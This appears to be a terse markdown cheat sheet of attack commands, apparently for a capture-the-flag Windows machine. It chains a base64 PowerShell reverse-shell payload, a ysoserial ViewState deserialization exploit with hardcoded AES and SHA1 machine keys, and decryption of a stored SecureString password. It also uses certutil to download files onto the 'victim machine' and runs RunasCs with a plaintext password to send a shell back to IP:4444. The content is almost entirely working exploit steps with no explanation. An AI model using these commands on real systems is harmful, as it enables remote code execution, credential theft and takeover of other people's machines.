## 1. Command to Get the Payload for Reverse Shell in base64 encoding:
`python3 Reverse_Shell_for_Power_Shell.py LISTENING_IP LISTENING_PORT `

## 2. Command to Get a Reverse Shell code (Paste the generated payload here):
`ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" -c "PASTE_PAYLOAD_HERE"`

## 3. Commands to Fetch Password
`echo PASSWORD > pass.txt`

`$EncryptedString = Get-Content .\pass.txt`

`$SecureString = ConvertTo-SecureString $EncryptedString`

`$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString`

`echo $Credential.GetNetworkCredential().password`

## 4. Command to Download files from Our Machine to Victim Machine (Windows):
`certutil.exe -urlcache -split -f "URL" ".\FILE"`

## 5. Command to Run Runascs from sfitz to get the shell of Alaading:
`.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r IP:4444`

